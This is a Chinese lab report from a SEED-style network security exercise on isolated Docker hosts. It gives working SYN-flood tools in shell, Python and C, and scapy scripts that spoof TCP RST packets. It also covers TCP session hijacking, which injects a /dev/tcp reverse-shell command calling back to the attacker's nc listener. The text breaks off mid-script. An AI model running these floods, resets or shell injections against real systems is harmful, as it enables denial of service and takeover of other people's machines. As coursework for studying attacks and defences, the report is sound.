# 0. 环境设置

## 0.1 配置过程

- `Ubuntu-Seed 16.04`

- 攻击机`IP`：`172.17.0.1`（主机）

- 用户机`IP`：`172.17.0.2`（`docker`容器`User`）

- 服务机`IP`：`172.17.0.3`（`docker`容器`Server`）

- 容器的创建和使用：

  ```shell
  # 查看容器
  sudo docker ps -a
  # 创建并运行容器
  sudo docker run -it --name=Server --hostname=Server --privileged "seedubuntu" /bin/bash
  sudo docker run -it --name=User --hostname=User --privileged "seedubuntu" /bin/bash
  # 运行容器
  sudo docker start User
  sudo docker exec -it User /bin/bash
  sudo docker start Server
  sudo docker exec -it Server /bin/bash
  # 关闭容器
  sudo docker stop User
  sudo docker stop Server
  # 删除容器
  sudo docker rm User
  sudo docker rm Server
  ```


## 0.2 配置结果

- 查看所有容器
  ![0.1.查看所有容器](https://raw.githubusercontent.com/BIIIANG/pic/main/0.1.%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E5%AE%B9%E5%99%A8.png)
- 查看攻击机的`IP`
  ![0.2.查看攻击机的IP](https://raw.githubusercontent.com/BIIIANG/pic/main/0.2.%E6%9F%A5%E7%9C%8B%E6%94%BB%E5%87%BB%E6%9C%BA%E7%9A%84IP.png)
- 查看用户机的`IP`
  ![0.3.查看用户机的IP](https://raw.githubusercontent.com/BIIIANG/pic/main/0.3.%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E6%9C%BA%E7%9A%84IP.png)
- 查看服务机的`IP`
  ![0.4.查看服务机的IP](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111649929.png)

<div style="page-break-after:always;"></div>

# 1. `SYN Flood`攻击

## 1.1 准备工作及相关命令

```shell
# 开启Server的telnet服务并查看telnet的运行状态
sudo /etc/init.d/openbsd-inetd restart
sudo netstat -a | grep telnet
# SYN cookie
sysctl net.ipv4.tcp_syncookies		# 查看SYN cookie状态
sysctl net.ipv4.tcp_syncookies=0	# 关闭SYN cookie
sysctl net.ipv4.tcp_syncookies=1	# 打开SYN cookie
# 查看网络状态
netstat -na
```

## 1.2 正常状态下的`telnet`连接

在客户机使用`telnet 172.17.0.3`连接服务机，并使用`Wireshark`截取报文（结果见`1.01.正常状态下的 telnet 连接.pcapng`）。

- 客户端成功连接服务器
  ![1.01.客户端成功连接服务器](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111710979.png)
- 服务器的网络连接状态：已与客户端成功建立`TCP`连接
  ![1.02.服务器的网络连接状态：已与客户端成功建立TCP连接](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111710073.png)
- 正常状态下的`TCP`连接的握手过程（前三行）
  ![1.03.正常状态下的TCP连接的握手过程](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111711246.png)
- 正常状态下的服务机的`CPU`与内存占用
  ![1.0.1.CPU0](https://raw.githubusercontent.com/BIIIANG/pic/main/202204132103104.png)

## 1.3 使用`netwox`进行攻击

### 1.3.1 关闭`SYN cookie`

- 关闭服务机的`SYN cookie`：`sysctl net.ipv4.tcp_syncookies=0`

- 查看`netwox 76`工具的说明：`netwox 76 --help`
  ![1.2.1.查看netwox 76工具的说明](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111734296.png)

- 攻击机使用`netwox`攻击服务机：`sudo netwox 76 -i 172.17.0.3 -p 23 -s raw`，观察到当发出一些请求后，攻击机被中断，`netwox`暂停
  ![1.2.2.使用netwox攻击服务机，当发出一些请求后，攻击机被中断](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111734211.png)

- 为了确保`netwox`持续工作，编写以下脚本文件`syn_netwox.sh`，将错误输出丢弃

  ```shell
  #!/bin/bash
  
  while [ 1 ]
  do
      sudo netwox 76 -i 172.17.0.3 -p 23 -s raw > /dev/null
  done
  ```

- 使用脚本`syn_netwox.sh`再次进行攻击
  ![1.2.3.使用脚本syn_netwox.sh再次进行攻击](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111735150.png)

- 客户机尝试使用`telnet`连接服务机失败，连接超时，攻击成功
  ![1.2.4.客户机再次尝试使用telnet连接服务机失败，连接超时](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111737884.png)
  
- 此时服务机的`CPU`与内存占用
  ![1.0.2.CPU1](https://raw.githubusercontent.com/BIIIANG/pic/main/202204132103425.png)

### 1.3.2 开启`SYN cookie`

- 开启服务机的`SYN cookie`：`sysctl net.ipv4.tcp_syncookies=1`
- 再次使用脚本`syn_netwox.sh`进行攻击，客户机仍能正常连接服务机，攻击失败（操作步骤依次为：①攻击机开始攻击；②使用`netstat`查看服务机网络状态；③使用`sysctl net.ipv4.tcp_syncookies`查看服务机的`SYN cookie`状态；④客户机使用`telnet`连接服务机成功，即攻击失败）
  ![1.2.5.开启SYN cookie后进行攻击，客户机仍能正常连接服务机，攻击失败](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111851345.png)

## 1.4 使用 scapy 进行攻击

### 1.4.1 关闭`SYN cookie`

- 关闭服务机的`SYN cookie`：`sysctl net.ipv4.tcp_syncookies=0`

- 攻击程序`syn_python.py`如下，在参考程序的基础上添加了多线程，以提高攻击速度：

  ```python
  #!/usr/bin/python3
  from scapy.all import IP, TCP, send
  from ipaddress import IPv4Address
  from random import getrandbits
  import _thread
  
  def syn_flood():
  	ip = IP(dst="172.17.0.3")			# Server IP
  	tcp = TCP(dport=23, flags='S')		# Server telnet port
  	pkt = ip/tcp
  	while True:
          # Random source IP
  	    pkt[IP].src = str(IPv4Address(getrandbits(32)))
          # Random source port
  	    pkt[TCP].sport = getrandbits(16)
          # Random sequence number
  	    pkt[TCP].seq = getrandbits(32)
  	    send(pkt, verbose = 0)
  
  try:
  	for i in range(0, 10):
          # Create multi-thread to attack
  		_thread.start_new_thread(syn_flood, ())
  except:
  	print("Create Thread Error.")
  
  while 1:
     pass
  ```

- 使用程序`syn_python.py`进行攻击：`sudo python3 ./syn_python.py`
  ![1.3.1.使用程序syn_python.py进行攻击](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111910844.png)

- 客户机尝试使用`telnet`连接服务机失败，连接超时，攻击成功
  ![1.3.2.客户机尝试使用telnet连接服务机失败，连接超时，攻击成功](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111911673.png)
  
- 此时服务机的`CPU`与内存占用
  ![1.0.3.CPU2](https://raw.githubusercontent.com/BIIIANG/pic/main/202204132103466.png)

### 1.4.2 开启`SYN cookie`

- 开启服务机的`SYN cookie`：`sysctl net.ipv4.tcp_syncookies=1`
- 再次使用程序`syn_python.py`进行攻击：`sudo python3 ./syn_python.py`
  ![1.3.3.再次使用程序syn_python.py进行攻击](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111918532.png)
- 客户机尝试使用`telnet`连接服务机成功，攻击失败
  ![1.3.4.客户机尝试使用telnet连接服务机成功，攻击失败](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111919835.png)

## 1.5 使用`C`语言程序进行攻击

### 1.5.1 关闭`SYN cookie`

- 关闭服务机的`SYN cookie`：`sysctl net.ipv4.tcp_syncookies=0`

- 攻击程序`syn_c.c`及头文件`syn_c.h`如下，在参考程序的基础上进修改了目标IP

  ```c
  // syn_c.c
  #include <unistd.h>
  #include <stdio.h>
  #include <stdlib.h>
  #include <time.h>
  #include <string.h>
  #include <sys/socket.h>
  #include <netinet/ip.h>
  #include <arpa/inet.h>
  
  #include "syn_c.h"
  
  #define DEST_IP    "172.17.0.3"   // Server IP
  #define DEST_PORT  23             // Server telnet port
  #define PACKET_LEN 1500
  
  unsigned short calculate_tcp_checksum(struct ipheader *ip);
  void send_raw_ip_packet(struct ipheader* ip);
  
  
  /******************************************************************
    Spoof a TCP SYN packet.
  *******************************************************************/
  int main() {
      char buffer[PACKET_LEN];
      struct ipheader *ip = (struct ipheader *) buffer;
      struct tcpheader *tcp = (struct tcpheader *) (buffer +
                                 sizeof(struct ipheader));
  
      srand(time(0)); // Initialize the seed for random # generation.
      while (1) {
          memset(buffer, 0, PACKET_LEN);
          /*********************************************************
            Step 1: Fill in the TCP header.
          ********************************************************/
          tcp->tcp_sport = rand(); // Use random source port
          tcp->tcp_dport = htons(DEST_PORT);
          tcp->tcp_seq   = rand(); // Use random sequence #
          tcp->tcp_offx2 = 0x50;
          tcp->tcp_flags = TH_SYN; // Enable the SYN bit
          tcp->tcp_win   = htons(20000);
          tcp->tcp_sum   = 0;
  
          /*********************************************************
            Step 2: Fill in the IP header.
          ********************************************************/
          ip->iph_ver = 4;   // Version (IPV4)
          ip->iph_ihl = 5;   // Header length
          ip->iph_ttl = 50;  // Time to live
          ip->iph_sourceip.s_addr = rand(); // Use a random IP address
          ip->iph_destip.s_addr = inet_addr(DEST_IP);
          ip->iph_protocol = IPPROTO_TCP; // The value is 6.
          ip->iph_len = htons(sizeof(struct ipheader) +
                             sizeof(struct tcpheader));
  
          // Calculate tcp checksum
          tcp->tcp_sum = calculate_tcp_checksum(ip);
  
          /*********************************************************
           Step 3: Finally, send the spoofed packet
          ********************************************************/
          send_raw_ip_packet(ip);
      }
  
      return 0;
  }
  
  
  /*************************************************************
    Given an IP packet, send it out using a raw socket.
  **************************************************************/
  void send_raw_ip_packet(struct ipheader* ip)
  {
      struct sockaddr_in dest_info;
      int enable = 1;
  
      // Step 1: Create a raw network socket.
      int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  
      // Step 2: Set socket option.
      setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
                       &enable, sizeof(enable));
  
      // Step 3: Provide needed information about destination.
      dest_info.sin_family = AF_INET;
      dest_info.sin_addr = ip->iph_destip;
  
      // Step 4: Send the packet out.
      sendto(sock, ip, ntohs(ip->iph_len), 0,
             (struct sockaddr *)&dest_info, sizeof(dest_info));
      close(sock);
  }
  
  
  unsigned short in_cksum (unsigned short *buf, int length)
  {
     unsigned short *w = buf;
     int nleft = length;
     int sum = 0;
     unsigned short temp=0;
  
     /*
      * The algorithm uses a 32 bit accumulator (sum), adds
      * sequential 16 bit words to it, and at the end, folds back all
      * the carry bits from the top 16 bits into the lower 16 bits.
      */
     while (nleft > 1)  {
         sum += *w++;
         nleft -= 2;
     }
  
     /* treat the odd byte at the end, if any */
     if (nleft == 1) {
          *(u_char *)(&temp) = *(u_char *)w ;
          sum += temp;
     }
  
     /* add back carry outs from top 16 bits to low 16 bits */
     sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16
     sum += (sum >> 16);                  // add carry
     return (unsigned short)(~sum);
  }
  
  
  /****************************************************************
    TCP checksum is calculated on the pseudo header, which includes
    the TCP header and data, plus some part of the IP header.
    Therefore, we need to construct the pseudo header first.
  *****************************************************************/
  unsigned short calculate_tcp_checksum(struct ipheader *ip)
  {
      struct tcpheader *tcp = (struct tcpheader *)((u_char *)ip +
                              sizeof(struct ipheader));
  
      int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader);
  
      /* pseudo tcp header for the checksum computation */
      struct pseudo_tcp p_tcp;
      memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));
  
      p_tcp.saddr  = ip->iph_sourceip.s_addr;
      p_tcp.daddr  = ip->iph_destip.s_addr;
      p_tcp.mbz    = 0;
      p_tcp.ptcl   = IPPROTO_TCP;
      p_tcp.tcpl   = htons(tcp_len);
      memcpy(&p_tcp.tcp, tcp, tcp_len);
  
      return (unsigned short) in_cksum((unsigned short *)&p_tcp,
                                       tcp_len + 12);
  }
  ```

  ```c
  // syn_c.h
  /* Ethernet header */
  struct ethheader {
      u_char  ether_dhost[6];    /* destination host address */
      u_char  ether_shost[6];    /* source host address */
      u_short ether_type;        /* IP? ARP? RARP? etc */
  };
  
  /* IP Header */
  struct ipheader {
    unsigned char      iph_ihl:4,     // IP header length
                       iph_ver:4;     // IP version
    unsigned char      iph_tos;       // Type of service
    unsigned short int iph_len;       // IP Packet length (data + header)
    unsigned short int iph_ident;     // Identification
    unsigned short int iph_flag:3,    // Fragmentation flags
                       iph_offset:13; // Flags offset
    unsigned char      iph_ttl;       // Time to Live
    unsigned char      iph_protocol;  // Protocol type
    unsigned short int iph_chksum;    // IP datagram checksum
    struct  in_addr    iph_sourceip;  // Source IP address
    struct  in_addr    iph_destip;    // Destination IP address
  };
  
  /* ICMP Header  */
  struct icmpheader {
    unsigned char icmp_type;        // ICMP message type
    unsigned char icmp_code;        // Error code
    unsigned short int icmp_chksum; // Checksum for ICMP Header and data
    unsigned short int icmp_id;     // Used for identifying request
    unsigned short int icmp_seq;    // Sequence number
  };
  
  /* UDP Header */
  struct udpheader
  {
    u_int16_t udp_sport;           /* source port */
    u_int16_t udp_dport;           /* destination port */
    u_int16_t udp_ulen;            /* udp length */
    u_int16_t udp_sum;             /* udp checksum */
  };
  
  /* TCP Header */
  struct tcpheader {
      u_short tcp_sport;               /* source port */
      u_short tcp_dport;               /* destination port */
      u_int   tcp_seq;                 /* sequence number */
      u_int   tcp_ack;                 /* acknowledgement number */
      u_char  tcp_offx2;               /* data offset, rsvd */
  #define TH_OFF(th)      (((th)->tcp_offx2 & 0xf0) >> 4)
      u_char  tcp_flags;
  #define TH_FIN  0x01
  #define TH_SYN  0x02
  #define TH_RST  0x04
  #define TH_PUSH 0x08
  #define TH_ACK  0x10
  #define TH_URG  0x20
  #define TH_ECE  0x40
  #define TH_CWR  0x80
  #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
      u_short tcp_win;                 /* window */
      u_short tcp_sum;                 /* checksum */
      u_short tcp_urp;                 /* urgent pointer */
  };
  
  /* Psuedo TCP header */
  struct pseudo_tcp
  {
          unsigned saddr, daddr;
          unsigned char mbz;
          unsigned char ptcl;
          unsigned short tcpl;
          struct tcpheader tcp;
          char payload[1500];
  };
  ```

- 使用程序`syn_c`进行攻击：`gcc -o syn_c syn_c.c && sudo ./syn_c`
  ![1.4.1.使用程序syn_c进行攻击](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111936782.png)

- 客户机尝试使用`telnet`连接服务机失败，连接超时，攻击成功
  ![1.4.2.客户机尝试使用telnet连接服务机失败，连接超时，攻击成功](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111936556.png)
  
- 此时服务机的`CPU`与内存占用
  ![1.0.4.CPU3](https://raw.githubusercontent.com/BIIIANG/pic/main/202204132104618.png)

### 1.5.2 开启`SYN cookie`

- 开启服务机的`SYN cookie`：`sysctl net.ipv4.tcp_syncookies=1`
- 再次使用程序`syn_c`进行攻击：`gcc -o syn_c syn_c.c && sudo ./syn_c`
  ![1.4.3.再次使用程序syn_c进行攻击](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111955611.png)
- 客户机尝试使用`telnet`连接服务机成功，攻击失败
  ![1.4.4客户机尝试使用telnet连接服务机成功，攻击失败](https://raw.githubusercontent.com/BIIIANG/pic/main/202204111955383.png)

<div style="page-break-after:always;"></div>

# 2. 针对`telnet`或`ssh`连接的`TCP RST`攻击

## 2.1 准备工作及相关命令

```shell
# 开启Server的telnet服务并查看telnet的运行状态
sudo /etc/init.d/openbsd-inetd restart
sudo netstat -a | grep telnet
```

## 2.2 攻击原理

`TCP RST`攻击可以终止两个受害者之间建立的`TCP`连接。 例如，如果两个用户`A`和`B`之间存在已建立的`telnet`连接，则攻击者可以伪造一个从`A`到`B`或从`B`到`A`的`RST`报文 ，从而破坏此现有连接。要成功进行此攻击，攻击者需要正确构建`TCP RST`数据包。 首先，每个`TCP`连接都由一个四元组唯一标识：源`IP`地址、源端口、目的`IP`地址、目的端口，因此，伪造数据包的这个四元组必须和连接中使用的一致。其次，伪造数据包的序列号必须是正确的，否则接收方会丢弃这个包。

## 2.3 利用`netwox`工具进行攻击

- 该攻击过程中的`Wireshark`数据见`2.1.利用netwox工具进行攻击.pcapng`
  
- 查看`netwox 78`工具的说明：`netwox 78 --help`
  ![2.3.1.查看netwox 78工具的说明](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112008115.png)

- 首先使用户机使用`telnet`连接服务机，然后攻击机使用`netwox`攻击：`sudo netwox 78 -d docker0`，之后在用户机的`telnet`中输入任意字符，可以发现连接断开，攻击成功
  ![2.3.2.首先使用户机使用telnet连接服务机，然后攻击机使用netwox攻击，之后在用户机的telnet中输入任意字符，可以发现连接断开，攻击成功](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112015944.png)

- `netwox`发送的`RST`报文如下（注：编号`64`的报文对应编号`59`的报文，编号`64`的报文对应编号`60`的报文）

  ![2.3.3.使用Wireshark截取报文，可以看到netwox发送的RST报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204132016473.png)
  
  ![2.3.4.使用Wireshark截取报文，可以看到netwox发送的RST报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204132019783.png)
  
- 观察和解释：你的攻击是否成功？你怎么知道它是否成功？你期待看到什么？你观察到了什么？观察结果是你预想的那样吗？
  - 攻击成功；
  - 用户机的`telnet`连接断开且`Wireshark`拦截到相应报文；
  - 期待看到用户机的`telnet`连接断开且`Wireshark`拦截到相应报文；
  - 观察到了用户机的`telnet`连接断开且`Wireshark`拦截到相应报文；
  - 是。



## 2.4 利用`scapy`手动攻击

- 该攻击过程中的`Wireshark`数据见`2.2.利用scapy手动攻击.pcapng`
  
- 首先使用户机使用`telnet`连接服务机，同时使用`Wireshark`截取报文，观察服务机向客户机发送的最后一个报文或客户机向服务器发送的最后一个报文，根据报文中的源`IP`、源端口、目的`IP`、目的端口，并将服务机向客户机发送的最后一个报文的`Ack`或客户机向服务机发送的最后一个报文的`Seq`作为`RST`报文的`Seq`（即后文程序中的`1713254838`）
  ![2.4.1.首先使用户机使用telnet连接服务机，同时使用Wireshark截取报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112033676.png)

- 根据以上拦截到的最后一个服务机发到客户机的报文，使用`scapy`构造并发送`RST`报文，程序如下

  ```python
  #!/usr/bin/python3
  from scapy.all import *
  
  print("SENDING RESET PACKET.........")
  ip  = IP(src="172.17.0.2", dst="172.17.0.3")
  tcp = TCP(sport=51632, dport=23, flags="R", seq=1713254838)
  pkt = ip/tcp
  ls(pkt)
  send(pkt,verbose=0)
  ```

- 运行攻击程序`reset_manual.py`进行攻击：`sudo python3 ./reset_manual.py`，之后在用户机的`telnet`中输入任意字符，可以发现连接断开且输入的字符没有回显（原因是攻击报文在发送输入字符的报文前到达服务机），攻击成功
  ![2.4.2.运行攻击程序reset_manual.py进行攻击，之后在用户机的telnet中输入任意字符，可以发现连接断开，攻击成功](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112035863.png)

- `scapy`发送的`RST`报文如下
  ![2.4.3.使用Wireshark截取报文，可以看到scapy发送的RST报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112039010.png)
  
- 观察和解释：你的攻击是否成功？你怎么知道它是否成功？你期待看到什么？你观察到了什么？观察结果是你预想的那样吗？

  - 攻击成功；
  - 用户机的`telnet`连接断开且`Wireshark`拦截到相应报文；
  - 期待看到用户机的`telnet`连接断开且`Wireshark`拦截到相应报文；
  - 观察到了用户机的`telnet`连接断开且`Wireshark`拦截到相应报文；
  - 是。

## 2.5 利用`scapy`自动攻击

- 该攻击过程中的`Wireshark`数据见`2.3.利用scapy自动攻击.pcapng`

- 模仿`2.4 利用scapy手动攻击`中的手动操作过程，此次向用户机发送`RST`报文，只需监听用户机向服务机的`telnet`端口发送的报文，将该报文中的四元组中的源与目的分别交换，且取该报文的`Ack`作为攻击报文的`Seq`，即可构造自动攻击程序如下，在参考程序的基础上添加监听的网卡`iface="docker0"`并填充了标注区域内的报文构造过程

  ```python
  #!/usr/bin/python3
  from scapy.all import *
  
  SRC  = "172.17.0.2"
  DST  = "172.17.0.3"
  PORT = 23
  
  def spoof(pkt):
      old_tcp = pkt[TCP]
      old_ip = pkt[IP]
  
      #############################################
      ip = IP(src = old_ip.dst, dst = old_ip.src)
      tcp = TCP(sport = old_tcp.dport, dport = old_tcp.sport, seq = old_tcp.ack, flags = "R") 
      #############################################
  
      pkt = ip/tcp
      send(pkt,verbose=0)
      print("Spoofed Packet: {} --> {}".format(ip.src, ip.dst))
  
  f = 'tcp and src host {} and dst host {} and dst port {}'.format(SRC, DST, PORT)
  sniff(filter=f, prn=spoof, iface="docker0")
  ```

- 首先使用户机使用`telnet`连接服务机，然后攻击机使用`reset_auto.py`进行攻击：`sudo python3 ./reset_auto.py`，之后在用户机的`telnet`中输入任意字符，可以发现连接断开，攻击成功
  ![2.5.1.首先使用户机使用telnet连接服务机，然后攻击机使用reset_auto.py进行攻击，之后在用户机的telnet中输入任意字符，可以发现连接断开，攻击成功](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112053616.png)

- `scapy`发送的`RST`报文如下（注：编号`62`的报文对应编号`57`的报文，编号`63`的报文对应编号`59`的报文，服务机没有发送`RST ACK`报文）
  ![2.5.2.使用Wireshark截取报文，可以看到scapy发送的RST报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204132031831.png)
  ![2.5.3.使用Wireshark截取报文，可以看到scapy发送的RST报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204132031061.png)
  
- 观察和解释：你的攻击是否成功？你怎么知道它是否成功？你期待看到什么？你观察到了什么？观察结果是你预想的那样吗？

  - 攻击成功；
  - 用户机的`telnet`连接断开且`Wireshark`拦截到相应报文；
  - 期待看到用户机的`telnet`连接断开且`Wireshark`拦截到相应报文；
  - 观察到了用户机的`telnet`连接断开且`Wireshark`拦截到相应报文；
  - 是。

<div style="page-break-after:always;"></div>

# 3. `TCP`会话劫持

## 3.1 准备工作及相关命令

使用`Ubuntu-Seed`的`Bless Hex Editor`对指令生成指令对应的`ASCII`编码如下

```shell
# ls 指令的 ASCII 编码
6c73
# /bin/bash -i > /dev/tcp/172.17.0.1/11803 0<&1 2>&1 指令的 ASCII 编码
2F62696E2F62617368202D69203E202F6465762F7463702F3137322E31372E302E312F313138303320303C263120323E2631
```

![3.1.1.获得指令的ASCII编码](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112103222.png)

## 3.2 攻击原理

`TCP`会话劫持攻击的目的是通过向此会话中注入恶意内容来劫持两个受害者之间的现有`TCP`连接（会话）。如果此连接是`telnet`会话，则攻击者可以将恶意命令注入此会话，从而使受害者执行恶意命令。为了伪造`TCP`数据包，应该正确设置序列号。假设接收方已经收到了一些数据，序列号到`x`，下一个序列号应该是`x+1`。如果伪造的数据包不用`x+1`作为序列号，而使用了`x+δ`,这会成为乱序包 。这个包中的数据会被存储在接收方的缓冲区中（只要缓冲区有足够的空间），但是不在空余空间的开端（即`x+1`），而被存储在`x+δ`的位置，也就是在缓冲区中会留下`δ`个空间。伪造的数据虽然存在缓冲区中，但不会交给应用程序，因此暂时没有效果。当空间被后来的数据填满后，伪造包中的数据才会被一起交给应用程序，从而产生影响。如果`δ`太大，就会落在缓冲区可容纳的范围之外，伪造包会因此被丢弃。

## 3.3 利用`netwox`工具进行攻击

### 3.3.1 普通命令

- 该攻击过程中的`Wireshark`数据见`3.1.利用netwox工具进行攻击.pcapng`
- 查看`netwox 40`工具的说明：`netwox 40 --help`
  ![3.3.1.查看netwox 40工具的说明](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112141266.png)
- 首先使用户机使用`telnet`连接服务机，同时使用`Wireshark`截取报文，观察服务机向客户机发送的最后一个报文，根据报文中的源`IP`、源端口、目的`IP`、目的端口、窗口大小，并将报文的`Ack`作为攻击报文的`Seq`、将报文的`Next sequence number`（即`Sequence number + TCP Segment Len`）作为攻击报文的`Ack`构造攻击命令，服务机向客户机发送的最后一个报文如下
  ![3.3.2.服务机向客户机发送的最后一个报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112141009.png)
- 然后攻击机使用`netwox`攻击：`sudo netwox 40 --ip4-src 172.17.0.2 --ip4-dst 172.17.0.3 --tcp-src 51654 --tcp-dst 23 --tcp-seqnum 3429685672 --tcp-acknum 3928771369 --tcp-ack --tcp-window 227 --tcp-data 0d6c730d00`，其中`0d6c730d00`为`\rls\r`的编码
  ![3.3.3.攻击机使用netwox攻击](pics/3.3.3.攻击机使用netwox攻击.png)
- `scapy`发送的攻击报文如下
  ![3.3.4.scapy发送的攻击报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112142171.png)
- 服务机返回的报文（即指令的运行结果）如下
  ![3.3.5.服务机返回的报文（指令的运行结果）](https://raw.githubusercontent.com/BIIIANG/pic/main/202204112142883.png)
- 观察和解释：你的攻击是否成功？你怎么知道它是否成功？你期待看到什么？你观察到了什么？观察结果是你预想的那样吗？
  - 攻击成功；
  - 用户机的`telnet`连接卡死且`Wireshark`拦截到相应的攻击报文和服务机返回的命令执行结果报文；
  - 期待看到用户机的`telnet`连接卡死（原因为服务机与用户机该`TCP`连接的序号错乱，下同）且`Wireshark`拦截到相应的攻击报文和服务机返回的命令执行结果报文；
  - 观察到了用户机的`telnet`连接卡死且`Wireshark`拦截到相应的攻击报文和服务机返回的命令执行结果报文；
  - 是。

### 3.3.2 反向`shell`

- 该攻击过程中的`Wireshark`数据见`3.2.利用netwox工具进行攻击(反向shell).pcapng`
- 具体步骤与普通命令的会话劫持相似，不同是在攻击前应先在攻击机使用`netcat`在指定端口进行监听，将攻击报文的数据换为反向`shell`对应的指令编码即可
- 首先使用户机使用`telnet`连接服务机，同时使用`Wireshark`截取报文，以下为服务机向客户机发送的最后一个报文
  ![3.3.6.服务机向客户机发送的最后一个报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121216514.png)
- 在攻击机的`11803`端口开启监听：`nc -l 11803 -v`，然后攻击机使用`netwox`攻击：`sudo netwox 40 --ip4-src 172.17.0.2 --ip4-dst 172.17.0.3 --tcp-src 51722 --tcp-dst 23 --tcp-seqnum 316185969 --tcp-acknum 3699656223 --tcp-ack --tcp-window 227 --tcp-data 0d2F62696E2F62617368202D69203E202F6465762F7463702F3137322E31372E302E312F313138303320303C263120323E26310d00`，其中数据为`\r/bin/bash -i > /dev/tcp/172.17.0.1/11803 0<&1 2>&1\r`的编码
  ![3.3.7.攻击机使用netwox攻击](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121216010.png)
- 攻击后攻击机的`nc`即可获得服务机的`shell`，攻击成功
  ![3.3.8.攻击后攻击机的nc即可获得服务机的shell，攻击成功](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121216690.png)
- `netwox`发送的攻击报文如下
  ![3.3.9.scapy发送的攻击报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121216462.png)
- 追踪反向`shell`的`TCP`流如下，与攻击机发送的指令与结果相同
  ![3.3.10.反向shell的TCP流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121216231.png)
- 观察和解释：你的攻击是否成功？你怎么知道它是否成功？你期待看到什么？你观察到了什么？观察结果是你预想的那样吗？
  - 攻击成功；
  - 用户机的`telnet`连接卡死、攻击机的`nc`获得服务机的`shell`且`Wireshark`拦截到相应的攻击报文和攻击机与服务机之间的`TCP`流数据；
  - 期待看到用户机的`telnet`连接卡死、攻击机的`nc`获得服务机的`shell`且`Wireshark`拦截到相应的攻击报文和攻击机与服务机之间的`TCP`流数据；
  - 观察到了用户机的`telnet`连接卡死、攻击机的`nc`获得服务机的`shell`且`Wireshark`拦截到相应的攻击报文和攻击机与服务机之间的`TCP`流数据；
  - 是。

## 3.4 用`scapy`手动攻击

### 3.4.1 普通命令

- 该攻击过程中的`Wireshark`数据见`3.3.利用scapy手动攻击.pcapng`

- 首先使用户机使用`telnet`连接服务机，同时使用`Wireshark`截取报文，观察服务机向客户机发送的最后一个报文，根据报文中的源`IP`、源端口、目的`IP`、目的端口、窗口大小，并将报文的`Ack`作为攻击报文的`Seq`、将报文的`Next sequence number`（即`Sequence number + TCP Segment Len`）作为攻击报文的`Ack`构造攻击报文，服务机向客户机发送的最后一个报文如下
  ![3.4.1.服务机向客户机发送的最后一个报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121238182.png)

- 根据以上报文构造攻击程序`hijacking_manual_simple.py`如下

  ```python
  #!/usr/bin/python3
  from scapy.all import *
  
  print("SENDING SESSION HIJACKING PACKET.........")
  ip = IP(src="172.17.0.2", dst="172.17.0.3")
  tcp = TCP(sport=51756, dport=23, flags="A", seq=3581025435, ack=1190321684)
  data = "\rls\r"
  pkt = ip/tcp/data
  send(pkt, verbose=0)
  ```

- 使用程序`hijcaking_manual_simple.py`进行攻击：`sudo python3 ./hijacking_manual_simple.py`

- `scapy`发送的攻击报文如下
  ![3.4.2.scapy发送的攻击报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121238959.png)

- 服务机返回的报文（即指令的运行结果）如下
  ![3.4.3.服务机返回的报文（指令的运行结果）](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121238181.png)
  
- 观察和解释：你的攻击是否成功？你怎么知道它是否成功？你期待看到什么？你观察到了什么？观察结果是你预想的那样吗？

  - 攻击成功；
  - 用户机的`telnet`连接卡死且`Wireshark`拦截到相应的攻击报文和服务机返回的命令执行结果报文；
  - 期待看到用户机的`telnet`连接卡死且`Wireshark`拦截到相应的攻击报文和服务机返回的命令执行结果报文；
  - 观察到了用户机的`telnet`连接卡死且`Wireshark`拦截到相应的攻击报文和服务机返回的命令执行结果报文；
  - 是。

### 3.4.2 反向`shell`

- 该攻击过程中的`Wireshark`数据见`3.4.利用scapy手动攻击(反向shell).pcapng`

- 与`3.4.1 普通命令`方法相同，可获得服务机向客户机发送的最后一个报文如下
  ![3.4.4.服务机向客户机发送的最后一个报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204121255756.png)

- 根据以上报文构造攻击程序`hijacking_manual_shell.py`如下

  ```python
  #!/usr/bin/python3
  from scapy.all import *
  
  print("SENDING SESSION HIJACKING PACKET.........")
